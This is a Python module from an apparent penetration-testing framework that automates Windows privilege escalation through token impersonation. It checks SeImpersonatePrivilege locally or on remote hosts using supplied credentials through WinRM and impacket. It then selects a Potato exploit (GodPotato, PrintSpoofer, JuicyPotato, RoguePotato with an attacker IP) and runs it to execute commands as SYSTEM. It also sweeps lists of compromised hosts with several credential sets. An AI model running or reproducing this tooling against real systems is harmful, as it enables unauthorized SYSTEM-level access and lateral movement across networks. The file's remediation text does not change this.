"""
Expedite Strike — Token Impersonation Engine
=============================================
For authorized penetration testing only.
Detects SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
and selects the best Potato exploit for SYSTEM escalation.

MITRE ATT&CK:
  T1134     — Access Token Manipulation
  T1134.001 — Token Impersonation/Theft
  T1134.002 — Create Process with Token
  T1068     — Exploitation for Privilege Escalation

Background:
  Windows services running as Network Service or Local Service often
  have SeImpersonatePrivilege, allowing them to impersonate any token.
  Potato exploits abuse COM/DCOM to coerce SYSTEM token impersonation:

  - JuicyPotato    (Windows < 2019, requires specific CLSID)
  - PrintSpoofer   (Windows >= 2019, abuses Print Spooler named pipe)
  - GodPotato      (Windows 2012-2022, most reliable modern)
  - SweetPotato    (combines PrintSpoofer + EfsPotato)
  - RoguePotato    (Windows 2019/2022 with OXID resolver)
"""

import os
import re
import subprocess
import socket
import platform
from typing import Callable, Dict, List, Optional, Tuple


_log_fn: Optional[Callable] = None

MITRE = [
    {"id": "T1134",     "name": "Access Token Manipulation"},
    {"id": "T1134.001", "name": "Token Impersonation/Theft"},
    {"id": "T1068",     "name": "Exploitation for Privilege Escalation"},
]

# Privilege names that enable token impersonation
IMPERSONATE_PRIVS = {
    "SeImpersonatePrivilege":        "HIGH",
    "SeAssignPrimaryTokenPrivilege": "HIGH",
    "SeDebugPrivilege":              "MEDIUM",
    "SeBackupPrivilege":             "MEDIUM",
    "SeRestorePrivilege":            "MEDIUM",
    "SeTcbPrivilege":                "CRITICAL",
    "SeCreateTokenPrivilege":        "CRITICAL",
}

# Windows version to Potato recommendation
POTATO_SELECTOR = {
    "2022": ["GodPotato", "SweetPotato", "PrintSpoofer"],
    "2019": ["PrintSpoofer", "GodPotato", "SweetPotato", "RoguePotato"],
    "2016": ["JuicyPotato", "SweetPotato", "GodPotato"],
    "2012": ["JuicyPotato", "GodPotato"],
    "2008": ["JuicyPotato", "RottenPotato"],
    "10":   ["PrintSpoofer", "GodPotato", "SweetPotato"],
    "7":    ["JuicyPotato", "RottenPotato"],
}

# Potato exploit commands
POTATO_COMMANDS = {
    "GodPotato": {
        "description": "Most reliable, works on Windows 2012-2022",
        "cmd": 'GodPotato.exe -cmd "cmd /c whoami > C:\\Windows\\Temp\\god_output.txt"',
        "download": "https://github.com/BeichenDream/GodPotato/releases",
        "cve": "N/A (privilege abuse)",
    },
    "PrintSpoofer": {
        "description": "Print Spooler named pipe impersonation (Windows 2019+)",
        "cmd": 'PrintSpoofer.exe -i -c cmd',
        "download": "https://github.com/itm4n/PrintSpoofer/releases",
        "cve": "N/A",
    },
    "SweetPotato": {
        "description": "Combines multiple potato techniques",
        "cmd": 'SweetPotato.exe -p cmd.exe -a "/c whoami"',
        "download": "https://github.com/CCob/SweetPotato",
        "cve": "CVE-2020-0683",
    },
    "JuicyPotato": {
        "description": "CLSID-based DCOM abuse (Windows < 2019)",
        "cmd": 'JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}',
        "download": "https://github.com/ohpe/juicy-potato/releases",
        "cve": "CVE-2018-0824",
    },
    "RoguePotato": {
        "description": "OXID resolver abuse (Windows 2019/2022)",
        "cmd": 'RoguePotato.exe -r <attacker_ip> -e "cmd.exe /c whoami"',
        "download": "https://github.com/antonioCoco/RoguePotato",
        "cve": "N/A",
    },
    "RottenPotato": {
        "description": "Legacy DCOM abuse (Windows 7/2008)",
        "cmd": 'rottenpotato.exe',
        "download": "https://github.com/foxglovesec/RottenPotato",
        "cve": "MS16-075",
    },
}


def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(msg)


def _run(cmd: list, timeout: int = 30) -> str:
    """Run subprocess, return combined output."""
    try:
        flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        r = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, creationflags=flags,
        )
        return (r.stdout or "") + (r.stderr or "")
    except FileNotFoundError:
        return "[NOT_FOUND]"
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"


# ── Privilege Detection (local) ────────────────────────────────────────────────

def check_local_privileges(log_fn: Callable = None) -> Dict:
    """
    Check current process privileges on Windows.

    Returns:
        {privileges: [{name, enabled}], has_impersonate, has_debug,
         current_user, is_admin, findings}
    """
    global _log_fn
    _log_fn = log_fn

    result = {
        "privileges":     [],
        "has_impersonate": False,
        "has_debug":       False,
        "current_user":    "",
        "is_admin":        False,
        "os_version":      "",
        "findings":        [],
    }

    if os.name != "nt":
        _log("  [TokenImp] Non-Windows system — token impersonation is Windows-specific")
        return result

    # Get current user
    user_out = _run(["whoami", "/all"], timeout=10)
    result["current_user"] = _run(["whoami"], timeout=5).strip()

    _log(f"  [TokenImp] Current user: {result['current_user']}")

    # Parse privileges from whoami /all
    in_priv_section = False
    for line in user_out.splitlines():
        if "PRIVILEGES INFORMATION" in line.upper():
            in_priv_section = True
            continue
        if not in_priv_section:
            continue
        if not line.strip():
            continue

        for priv_name, severity in IMPERSONATE_PRIVS.items():
            if priv_name in line:
                enabled = "Enabled" in line or "enabled" in line.lower()
                result["privileges"].append({
                    "name":     priv_name,
                    "enabled":  enabled,
                    "severity": severity,
                    "line":     line.strip(),
                })
                _log(f"  [TokenImp] ✅ {priv_name}: {'ENABLED' if enabled else 'Disabled'}")

                if priv_name == "SeImpersonatePrivilege":
                    result["has_impersonate"] = True
                if priv_name == "SeDebugPrivilege":
                    result["has_debug"] = True

    # Check admin
    admin_out = _run(["net", "session"], timeout=5)
    result["is_admin"] = "There are no entries" in admin_out or not admin_out.strip()

    # Get OS version
    try:
        result["os_version"] = platform.version()
        _log(f"  [TokenImp] OS Version: {result['os_version']}")
    except Exception:
        pass

    return result


# ── Remote Privilege Check (via SSH/WinRM) ─────────────────────────────────────

def check_remote_privileges(
    target: str,
    username: str,
    password: str,
    domain: str = "",
    log_fn: Callable = None,
) -> Dict:
    """
    Check privileges on a remote Windows host via WinRM or SMB.

    Args:
        target:   Target IP or hostname
        username: Windows username
        password: Password or NT hash (:HASH format)
        domain:   Domain (optional)
        log_fn:   Logging callback

    Returns:
        Same structure as check_local_privileges() + target info
    """
    global _log_fn
    _log_fn = log_fn

    result = {
        "target":          target,
        "username":        username,
        "privileges":      [],
        "has_impersonate": False,
        "has_debug":       False,
        "is_admin":        False,
        "os_version":      "",
        "findings":        [],
    }

    _log(f"  [TokenImp] Checking privileges on {target} as {username}...")

    # Method 1: Try WinRM (port 5985)
    try:
        import winrm
        session = winrm.Session(
            f"http://{target}:5985/wsman",
            auth=(f"{domain}\\{username}" if domain else username, password),
            transport="ntlm",
        )
        r = session.run_cmd("whoami /all")
        if r.status_code == 0:
            output = r.std_out.decode("utf-8", errors="replace")
            _parse_priv_output(output, result)
            _log(f"  [TokenImp] WinRM connection successful")
            return result
    except ImportError:
        pass
    except Exception as e:
        _log(f"  [TokenImp] WinRM failed: {e}")

    # Method 2: Impacket wmiexec
    cred_str = f"{domain}/{username}:{password}@{target}" if domain else f"{username}:{password}@{target}"
    out = _run([
        "python", "-m", "impacket.examples.wmiexec",
        cred_str,
        "whoami /all"
    ], timeout=30)

    if out and "[NOT_FOUND]" not in out and "[ERROR]" not in out:
        _parse_priv_output(out, result)
        return result

    # Method 3: Impacket smbexec
    out = _run([
        "python", "-m", "impacket.examples.smbexec",
        cred_str,
        "-c", "whoami /all"
    ], timeout=30)

    if out and "[NOT_FOUND]" not in out:
        _parse_priv_output(out, result)

    return result


def _parse_priv_output(output: str, result: Dict):
    """Parse whoami /all output and populate result dict."""
    for line in output.splitlines():
        for priv_name, severity in IMPERSONATE_PRIVS.items():
            if priv_name in line:
                enabled = "enabled" in line.lower() or "Enabled" in line
                result["privileges"].append({
                    "name":     priv_name,
                    "enabled":  enabled,
                    "severity": severity,
                })
                if priv_name == "SeImpersonatePrivilege" and enabled:
                    result["has_impersonate"] = True
                    _log(f"  [TokenImp] ✅ SeImpersonatePrivilege ENABLED on {result.get('target','')}")
                if priv_name == "SeDebugPrivilege" and enabled:
                    result["has_debug"] = True


# ── Potato Selector ────────────────────────────────────────────────────────────

def select_potato_exploit(os_version: str, log_fn: Callable = None) -> Tuple[str, Dict]:
    """
    Select the best Potato exploit for the given Windows version.

    Args:
        os_version: Windows version string (e.g. '10.0.17763', 'Server 2019')
        log_fn:     Logging callback

    Returns:
        (best_potato_name, potato_info_dict)
    """
    global _log_fn
    _log_fn = log_fn

    os_lower = os_version.lower()

    # Match OS to potato
    if "2022" in os_lower or "11" in os_lower:
        candidates = POTATO_SELECTOR["2022"]
    elif "2019" in os_lower or "17763" in os_lower or "18362" in os_lower:
        candidates = POTATO_SELECTOR["2019"]
    elif "2016" in os_lower or "14393" in os_lower:
        candidates = POTATO_SELECTOR["2016"]
    elif "2012" in os_lower or "9200" in os_lower or "9600" in os_lower:
        candidates = POTATO_SELECTOR["2012"]
    elif "2008" in os_lower or "vista" in os_lower:
        candidates = POTATO_SELECTOR["2008"]
    elif "10" in os_lower or "10240" in os_lower:
        candidates = POTATO_SELECTOR["10"]
    elif "7" in os_lower or "6.1" in os_lower:
        candidates = POTATO_SELECTOR["7"]
    else:
        candidates = ["GodPotato", "PrintSpoofer", "SweetPotato"]

    best = candidates[0]
    info = POTATO_COMMANDS.get(best, {})

    _log(f"  [TokenImp] OS: {os_version}")
    _log(f"  [TokenImp] Recommended exploit: {best}")
    _log(f"  [TokenImp] Description: {info.get('description','')}")
    _log(f"  [TokenImp] Command: {info.get('cmd','')}")

    return best, info


# ── Token Impersonation Execution ──────────────────────────────────────────────

def run_token_impersonation(
    target: str = "local",
    username: str = "",
    password: str = "",
    domain: str = "",
    command: str = "whoami",
    log_fn: Callable = None,
) -> Dict:
    """
    Detect impersonation privileges and execute token impersonation.

    For LOCAL target: runs against current process (pentester's machine).
    For REMOTE target: checks via WinRM/wmiexec and provides exploit guidance.

    Args:
        target:   'local' or remote IP
        username: Credentials for remote target
        password: Password
        domain:   Domain
        command:  Command to execute as SYSTEM (default: whoami)
        log_fn:   Logging callback

    Returns:
        {has_impersonate, potato_exploit, exploit_cmd, output, findings, mitre}
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"\n{'='*60}")
    _log(f"  [TokenImp] TOKEN IMPERSONATION ENGINE")
    _log(f"  [TokenImp] Target  : {target}")
    _log(f"  [TokenImp] Command : {command}")
    _log(f"{'='*60}\n")

    # Step 1: Check privileges
    if target == "local":
        priv_info = check_local_privileges(log_fn)
    else:
        priv_info = check_remote_privileges(target, username, password, domain, log_fn)

    has_impersonate = priv_info.get("has_impersonate", False)
    os_version      = priv_info.get("os_version", "unknown")
    findings        = []
    potato_name     = ""
    potato_info     = {}
    exec_output     = ""

    if not has_impersonate and not priv_info.get("has_debug"):
        _log(f"  [TokenImp] ⚠ No impersonation privileges found on {target}")
        return {
            "has_impersonate": False,
            "potato_exploit":  "",
            "exploit_cmd":     "",
            "output":          "",
            "findings":        [],
            "mitre":           MITRE,
            "summary":         "No impersonation privileges — not exploitable",
        }

    _log(f"  [TokenImp] ✅ Impersonation privileges detected!")

    # Step 2: Select best Potato
    potato_name, potato_info = select_potato_exploit(os_version, log_fn)

    # Step 3: Try to execute locally if local target
    if target == "local" and os.name == "nt":
        # Check if any potato binary is available
        for name, info in POTATO_COMMANDS.items():
            binary = name + ".exe"
            binary_path = os.path.join(
                os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                "tools", binary
            )
            if os.path.exists(binary_path):
                _log(f"  [TokenImp] Found {binary} — attempting execution...")
                cmd_to_run = info["cmd"].replace(
                    "{CLSID}", "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"  # Common CLSID
                ).split()
                exec_output = _run([binary_path] + cmd_to_run[1:], timeout=30)
                _log(f"  [TokenImp] Output: {exec_output[:200]}")
                potato_name = name
                potato_info = info
                break

    # Step 4: Build exploit guidance
    exploit_cmd = potato_info.get("cmd", "")

    # Build findings
    findings.append({
        "title":       f"SeImpersonatePrivilege — SYSTEM Escalation Possible ({target})",
        "severity":    "Critical",
        "description": (
            f"Target {target} has SeImpersonatePrivilege enabled. "
            f"This allows token impersonation attacks (Potato exploits) to escalate to SYSTEM. "
            f"Recommended exploit: {potato_name}\n"
            f"Command: {exploit_cmd}\n"
            f"Download: {potato_info.get('download', '')}"
        ),
        "target":      target if target != "local" else "localhost",
        "mitre_id":    "T1134.001",
        "mitre_name":  "Token Impersonation/Theft",
        "remediation": (
            "Run services as dedicated low-privilege service accounts without "
            "SeImpersonatePrivilege. Use Windows Service Accounts (gMSA). "
            "Apply principle of least privilege for all service identities."
        ),
    })

    # Log all candidates
    _log(f"\n  [TokenImp] Potato Exploit Candidates for {os_version}:")
    for p in POTATO_SELECTOR.get("2019", []):
        info_p = POTATO_COMMANDS.get(p, {})
        _log(f"  [TokenImp]   {p}: {info_p.get('description', '')}")
        _log(f"  [TokenImp]     {info_p.get('cmd', '')}")

    return {
        "has_impersonate": has_impersonate,
        "potato_exploit":  potato_name,
        "exploit_cmd":     exploit_cmd,
        "potato_info":     potato_info,
        "privileges":      priv_info.get("privileges", []),
        "os_version":      os_version,
        "output":          exec_output,
        "findings":        findings,
        "mitre":           MITRE,
        "summary":         (
            f"{'SYSTEM escalation possible' if has_impersonate else 'No escalation path'} "
            f"via {potato_name} on {target}"
        ),
    }


# ── Bulk Token Check Across Hosts ─────────────────────────────────────────────

def scan_hosts_for_impersonation(
    hosts: List[Dict],
    credentials: List[Dict],
    log_fn: Callable = None,
) -> Dict:
    """
    Check all compromised hosts for token impersonation opportunities.

    Args:
        hosts:       List of {ip, os, ports} dicts from scan
        credentials: List of {username, password, domain} dicts
        log_fn:      Logging callback

    Returns:
        {vulnerable_hosts, findings, mitre, summary}
    """
    global _log_fn
    _log_fn = log_fn

    vulnerable_hosts = []
    all_findings     = []

    _log(f"  [TokenImp] Scanning {len(hosts)} host(s) for impersonation privs...")

    for host in hosts:
        ip    = host.get("ip", "")
        ports = host.get("ports", [])

        # Only check Windows hosts (port 445 or 3389)
        if 445 not in ports and 3389 not in ports and 5985 not in ports:
            continue

        for cred in credentials[:3]:  # Try up to 3 credential sets
            result = run_token_impersonation(
                target=ip,
                username=cred.get("username", ""),
                password=cred.get("password", ""),
                domain=cred.get("domain", ""),
                log_fn=log_fn,
            )
            if result.get("has_impersonate"):
                vulnerable_hosts.append({
                    "ip":             ip,
                    "potato":         result["potato_exploit"],
                    "exploit_cmd":    result["exploit_cmd"],
                    "credentials":    cred,
                })
                all_findings.extend(result["findings"])
                break

    _log(f"  [TokenImp] {len(vulnerable_hosts)} vulnerable host(s) found")

    return {
        "vulnerable_hosts": vulnerable_hosts,
        "findings":         all_findings,
        "mitre":            MITRE,
        "summary":          f"{len(vulnerable_hosts)} host(s) vulnerable to token impersonation",
    }
